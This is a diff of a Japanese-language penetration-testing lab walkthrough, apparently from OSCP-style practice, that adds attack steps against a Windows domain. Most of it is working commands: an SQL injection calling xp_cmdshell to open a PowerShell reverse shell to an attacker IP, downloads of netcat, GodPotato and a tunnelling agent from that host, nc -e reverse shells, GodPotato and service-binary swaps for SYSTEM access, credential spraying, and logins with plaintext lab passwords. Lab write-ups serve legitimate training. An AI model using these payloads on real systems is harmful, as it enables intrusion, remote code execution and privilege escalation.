@@ -8,12 +8,19 @@ input SQLi in username form
 ```
 then get the revshell
 ```
-' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.187'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
+' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.233'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
+```
+
+必要なものダウンロード
+```
+iwr -uri http://192.168.45.233:8000/nc64.exe -outfile nc.exe
+iwr -uri http://192.168.45.233:8000/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+iwr -uri http://192.168.45.233:8000/agent.exe -outfile agent.exe
 ```
 
 revshellがこれだけだと怖いので、何個か張っておく
 ```
-Start-Process "C:\Tools\nc.exe" -ArgumentList "192.168.45.172 1111 -e cmd.exe"
+Start-Process "C:\Tools\nc.exe" -ArgumentList "192.168.45.233 4445 -e cmd.exe"
 ```
 
 printspooferを試す
@@ -23,7 +30,7 @@ printspooferを試す
 
 SeImpersonateが取れているので、GodPotatoをしてSYSTEM権限に昇格
 ```
-.\GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.187 4445"
+.\GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.233 4445"
 ```
 
 proof.txtを発見
@@ -41,6 +48,10 @@ joe:Flowers1
 ```
 
 ligolo-ngをセット
+```
+./agent.exe -connect 192.168.45.233:11601 -ignore-cert
+```
+
 AD enumeration
 ```
 nxc smb ip.txt -u joe -p Flowers1 --continue-on-success
@@ -115,6 +126,79 @@ windows enumeration
     FILES02\Administrator
 ```
 
+172.16.102.83にevil-winrmで入れた
+```
+evil-winrm -i 172.16.102.83 -u "wario" -p "Mushroom\!"
+```
+
+.83のlocal.txtを取得
+```
+type C:\Users\wario\Desktop\local.txt
+```
+
+winpeasでauditTrackerというサービスが脆弱であることが判明する
+
+msfvenomでx64のペイロードを生成
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+```
+
+moveでauditTracker.exeと入れ替えして、sc.exeでサービスをリスタートし権限昇格
+```
+move C:\DevelopmentExecutables\auditTracker.exe ./auditTracker.exe
+move ./shell-x64.exe C:\DevelopmentExecutables\auditTracker.exe
+sc.exe stop auditTracker
+sc.exe start auditTracker
+```
+
+proof.txtを取得
+```
+type C:\Users\Administrator\Desktop\proof.txt
+```
+
+yoshiをusers.txtに入れてnxcでスキャン
+```
+sudo nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success
+```
+
+yoshi、wario、joeで.82に認証が通ることを確認し、３ユーザでrdp接続を試みるとyoshiでrdp可能
+```
+xfreerdp3 /u:yoshi /p:"Mushroom\!" /v:172.16.102.82
+```
+
+net user /domainを使用し、以下のユーザをゲット
+```
+peach
+leon
+mario
+```
+
+yoshiはローカル管理者のようなので、runasで権限昇格
+
+proof.txtを取得
+```
+type C:\Users\Administrator\Desktop\proof.txt
+```
+
+hole.txtがある(多分ラビットホール)
+```
+leon:rabbit!:)
+```
+
+bloodhoundからleonがdomain adminsでDEV04にセッションがあることが分かる
+DEV04に同様にnxcをかける
+```
+sudo nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success
+```
+
+yoshiでDEV04にrdp可能
+```
+xfreerdp3 /u:yoshi /p:"Mushroom\!" /v:172.16.102.12
+```
+
+desktopにlocal.txt
+
+winpeasを実行すると、backup.exeが書き込み可能となっている
 
 
 # DMZ
